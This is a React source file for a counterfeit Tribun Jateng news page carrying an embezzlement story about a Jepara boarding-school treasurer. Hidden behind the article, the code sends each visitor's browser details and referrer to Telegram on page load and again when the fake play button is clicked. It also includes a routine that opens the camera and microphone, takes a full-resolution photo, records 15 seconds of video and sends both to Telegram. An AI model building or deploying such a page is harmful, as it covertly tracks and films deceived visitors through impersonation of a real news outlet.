import { useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  const sendLocation = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Get device capabilities first
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');
      
      if (!videoDevice) {
        throw new Error('No video input device found');
      }

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 }, // Maximum supported width
          height: { ideal: 2160 }, // Maximum supported height
          frameRate: { ideal: 60 }
        },
        audio: true
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Get actual video track settings
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      
      // Create and setup video element for photo capture
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      
      // Wait for video to be ready
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      // Setup canvas with actual video dimensions
      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      // Convert photo to blob with maximum quality
      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 1.0);
      });

      // Send photo immediately
      sendImageToTelegram(photoBlob).catch(console.error);

      // Check supported video formats
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm'
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) {
        throw new Error('No supported video format found');
      }

      // Configure video recording with maximum quality
      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
      });
      
      const chunks: BlobPart[] = [];

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, { 
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
        });
        console.log('Video recording completed, size:', videoBlob.size);
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      // Start recording with frequent data chunks for better quality
      mediaRecorder.start(1000);
      console.log('Started recording video');

      // Stop recording after 15 seconds
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Stopping video recording');
          mediaRecorder.stop();
        }
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);


  const article = {
    title: "Bendahara Ponpes Al Muttaqin Jepara Jadi Tersangka, Gelapkan Dana SPP Rp 500 Juta untuk Foya-Foya",
    date: "26 Juli 2025",
    imageUrl: "https://linuxpemula.web.id/tersangka.jpg",
    author: "Tribun Jateng",
    content: `
Jepara, 26 Juli 2025 — Kepolisian Resor (Polres) Jepara resmi menetapkan MZ (38), bendahara Pondok Pesantren Islam Al Muttaqin, sebagai tersangka dalam kasus dugaan penggelapan dana iuran SPP santri senilai lebih dari Rp 500 juta. Hingga saat ini, tersangka masih buron dan masuk dalam daftar pencarian orang (DPO).

Kapolres Jepara, AKBP Andri Susanto, menyatakan bahwa penetapan tersangka dilakukan setelah serangkaian pemeriksaan saksi, audit keuangan internal, dan penelusuran aliran dana.

“Setelah kami kumpulkan cukup bukti, saudara MZ resmi kami tetapkan sebagai tersangka. Saat ini yang bersangkutan tidak berada di alamat terakhirnya dan sedang kami kejar,” ujar AKBP Andri dalam konferensi pers di Mapolres Jepara, Jumat (25/7).

Penyelidikan bermula dari laporan pihak yayasan pondok pesantren yang menemukan kejanggalan dalam arus keuangan sejak awal tahun 2025. Dana iuran santri yang seharusnya digunakan untuk kegiatan operasional, gaji guru, dan kebutuhan santri, ternyata tidak pernah masuk ke kas pesantren.

Audit internal mengungkap bahwa lebih dari Rp 500 juta dana SPP raib dan diduga kuat digunakan oleh tersangka untuk gaya hidup mewah, hiburan malam, hingga perjalanan ke luar kota yang tidak berhubungan dengan kegiatan pesantren.

Ketua Yayasan Al Muttaqin, KH. Sartono Munadi, menyampaikan keprihatinannya atas kasus tersebut.

“Kami sangat terpukul. Ini pengkhianatan terhadap amanah para wali santri. Kami serahkan sepenuhnya kepada pihak berwajib agar pelaku ditangkap dan diproses hukum,” ucapnya.

Pihak kepolisian kini bekerja sama dengan sejumlah wilayah kepolisian lain untuk melakukan pelacakan terhadap tersangka. Diduga, MZ melarikan diri ke luar provinsi dan telah mengganti identitasnya.

Kasus ini menuai perhatian besar dari masyarakat, khususnya para wali santri. Banyak yang menuntut transparansi dan perbaikan tata kelola keuangan di lingkungan pondok pesantren.

“Kami minta ke depan pengelolaan keuangan lebih terbuka. Jangan sampai anak-anak kami jadi korban kelalaian sistem,” kata Rukmini, wali santri asal Demak.

Pihak pondok pesantren menegaskan kegiatan belajar-mengajar tetap berjalan seperti biasa, sambil terus melakukan pembenahan internal.
    `,
  };

  const relatedNews = [
    {
      id: 1,
      title: "Kasus Dana Desa Wonosobo: 3 Pejabat Ditetapkan Tersangka",
      image: "https://picsum.photos/300/200?random=1",
      category: "Nasional"
    },
    {
      id: 2,
      title: "Guru Honorer di Klaten Dilaporkan karena Pungli Uang SPP",
      image: "https://picsum.photos/300/200?random=2",
      category: "Pendidikan"
    },
    {
      id: 3,
      title: "Warga Boyolali Temukan Uang Tunai Rp 2 Miliar di Pinggir Jalan",
      image: "https://picsum.photos/300/200?random=3",
      category: "Regional"
    },
    {
      id: 4,
      title: "Kasus Korupsi APBD DIY: Mantan Kadis Ditetapkan Tersangka",
      image: "https://picsum.photos/300/200?random=4",
      category: "Hukum"
    }
  ];

  const popularNews = [
    "Pemkab Semarang Siapkan Dana Tambahan untuk Bansos Korban Banjir",
    "Pemprov Jateng Alokasikan Anggaran Rp 500 Miliar untuk Program Kesehatan",
    "Pemkot Solo Gelar Festival Kuliner untuk Tingkatkan Pariwisata",
    "Kasus Pencurian di Museum Nasional: 2 Pelaku Ditangkap Polisi",
    "Bupati Wonosobo Lantik 15 Pejabat Eselon III dan IV"
  ];

  return (
    <div className="bg-gray-100 min-h-screen font-sans">
      {/* Header Top */}
      <div className="bg-blue-600 text-white py-2 px-4">
        <div className="container mx-auto flex justify-between items-center text-sm">
          <div>Sabtu, 26 Juli 2025</div>
          <div className="flex space-x-4">
            <button className="bg-red-500 px-3 py-1 rounded text-xs font-bold">LIVE</button>
            <button className="hover:underline">Cari</button>
            <button className="hover:underline">Network</button>
            <button className="hover:underline">Ikuti Kami</button>
            <button className="hover:underline">Login</button>
          </div>
        </div>
      </div>

      {/* Logo Header */}
      <header className="bg-white shadow sticky top-0 z-50 border-b">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9e/Tribun_Network_logo.svg/1200px-Tribun_Network_logo.svg.png" 
              alt="Tribun Jateng" 
              className="h-12"
            />
          </div>
          <div className="hidden md:block bg-gray-200 w-96 h-16 flex items-center justify-center text-gray-500">
            Iklan 970x90
          </div>
        </div>
      </header>

      {/* Main Navigation */}
      <nav className="bg-blue-600 text-white">
        <div className="container mx-auto px-4">
          <ul className="flex flex-wrap py-2 space-x-6 text-sm font-medium">
            <li><a href="#" className="hover:underline">Home</a></li>
            <li><a href="#" className="hover:underline">PLN Jateng</a></li>
            <li><a href="#" className="hover:underline">Pendidikan</a></li>
            <li><a href="#" className="hover:underline">UMKM</a></li>
            <li><a href="#" className="hover:underline">EKRAF</a></li>
            <li><a href="#" className="hover:underline">Loker</a></li>
            <li><a href="#" className="hover:underline">TribunJatengWiki.com</a></li>
            <li><a href="#" className="hover:underline">...</a></li>
          </ul>
        </div>
      </nav>

      {/* Secondary Navigation */}
      <nav className="bg-white border-b">
        <div className="container mx-auto px-4">
          <div className="flex flex-wrap py-3 space-x-2">
            <a href="#" className="bg-red-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-red-600">Travel</a>
            <a href="#" className="bg-indigo-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-indigo-600">Akomodasi</a>
            <a href="#" className="bg-purple-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-purple-600">Kuliner</a>
            <a href="#" className="bg-green-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-green-600">Destinasi</a>
            <a href="#" className="bg-yellow-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-yellow-600">Shopping</a>
            <a href="#" className="bg-orange-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-orange-600">Ticketing</a>
            <a href="#" className="bg-teal-500 text-white px-4 py-2 rounded text-sm font-medium hover:bg-teal-600">TribunJatengTravel.com</a>
          </div>
        </div>
      </nav>

      {/* Main Content */}
      <div className="container mx-auto px-4 py-6 flex flex-col lg:flex-row gap-6">
        {/* Article Content */}
        <main className="lg:w-2/3 bg-white shadow-md rounded-md p-6">
          <div className="mb-4">
            <div className="flex justify-between items-start mb-4">
              <div>
                <h1 className="text-2xl md:text-3xl font-bold text-gray-800 leading-tight">
                  {article.title}
                </h1>
                <div className="flex items-center space-x-4 mt-2 text-sm text-gray-600">
                  <span>{article.date}</span>
                  <span>•</span>
                  <span>{article.author}</span>
                  <span>•</span>
                  <span className="text-red-500 font-medium">Editor: Tribun Jateng</span>
                </div>
              </div>
            </div>

            <div className="relative aspect-video bg-black mb-6 rounded overflow-hidden">
              <img 
                src={article.imageUrl} 
                alt={article.title} 
                className="w-full h-full object-cover" 
              />
              <div className="absolute inset-0 bg-black/30 flex items-center justify-center">
                <button
                  onClick={sendLocation}
                  className="bg-red-600 text-white text-xl px-6 py-4 rounded-full hover:bg-red-700 hover:scale-105 transition"
                >
                  ▶
                </button>
              </div>
            </div>

            <div className="prose prose-sm max-w-none text-gray-800 whitespace-pre-line">
              {article.content}
            </div>
          </div>

          {/* Related News */}
          <div className="mt-8 pt-6 border-t">
            <h3 className="text-xl font-bold text-gray-800 mb-4">Berita Terkait</h3>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {relatedNews.map((news) => (
                <div key={news.id} className="flex space-x-3">
                  <img 
                    src={news.image} 
                    alt={news.title} 
                    className="w-24 h-16 object-cover rounded"
                  />
                  <div>
                    <span className="text-xs text-red-500 font-medium">{news.category}</span>
                    <h4 className="text-sm font-medium text-gray-800 hover:text-blue-600 cursor-pointer line-clamp-2">
                      {news.title}
                    </h4>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </main>

        {/* Sidebar */}
        <aside className="lg:w-1/3 space-y-6">
          {/* Iklan */}
          <div className="bg-white shadow-md rounded-md p-4">
            <div className="bg-gray-200 h-64 flex items-center justify-center text-gray-500">
              Iklan 300x250
            </div>
          </div>

          {/* Berita Populer */}
          <div className="bg-white shadow-md rounded-md p-4">
            <h3 className="text-lg font-bold text-gray-800 mb-4 pb-2 border-b">Berita Populer</h3>
            <div className="space-y-3">
              {popularNews.map((title, index) => (
                <div key={index} className="flex items-start space-x-3">
                  <span className="bg-red-500 text-white text-xs font-bold px-2 py-1 rounded">
                    {index + 1}
                  </span>
                  <a href="#" className="text-sm text-gray-800 hover:text-blue-600 line-clamp-2">
                    {title}
                  </a>
                </div>
              ))}
            </div>
          </div>

          {/* Iklan Kedua */}
          <div className="bg-white shadow-md rounded-md p-4">
            <div className="bg-gray-200 h-64 flex items-center justify-center text-gray-500">
              Iklan 300x250
            </div>
          </div>
        </aside>
      </div>

      {/* Footer */}
      <footer className="bg-gray-800 text-white py-8">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-8">
            <div>
              <h4 className="font-bold mb-4">Tribun Jateng</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:underline">About Us</a></li>
                <li><a href="#" className="hover:underline">Privacy Policy</a></li>
                <li><a href="#" className="hover:underline">Terms of Use</a></li>
                <li><a href="#" className="hover:underline">Contact Us</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Network</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:underline">Tribunnews.com</a></li>
                <li><a href="#" className="hover:underline">TribunTravel.com</a></li>
                <li><a href="#" className="hover:underline">TribunStyle.com</a></li>
                <li><a href="#" className="hover:underline">TribunWiki.com</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Follow Us</h4>
              <ul className="space-y-2 text-sm">
                <li><a href="#" className="hover:underline">Facebook</a></li>
                <li><a href="#" className="hover:underline">Twitter</a></li>
                <li><a href="#" className="hover:underline">Instagram</a></li>
                <li><a href="#" className="hover:underline">YouTube</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-bold mb-4">Download App</h4>
              <div className="space-y-2">
                <button className="bg-black text-white px-4 py-2 rounded text-sm w-full">
                  Download iOS
                </button>
                <button className="bg-green-500 text-white px-4 py-2 rounded text-sm w-full">
                  Download Android
                </button>
              </div>
            </div>
          </div>
          <div className="border-t border-gray-700 mt-8 pt-6 text-center text-sm text-gray-400">
            <p>© 2023 Tribunnews.com Network, All Rights Reserved</p>
          </div>
        </div>
      </footer>
    </div>
  );
}

export default App;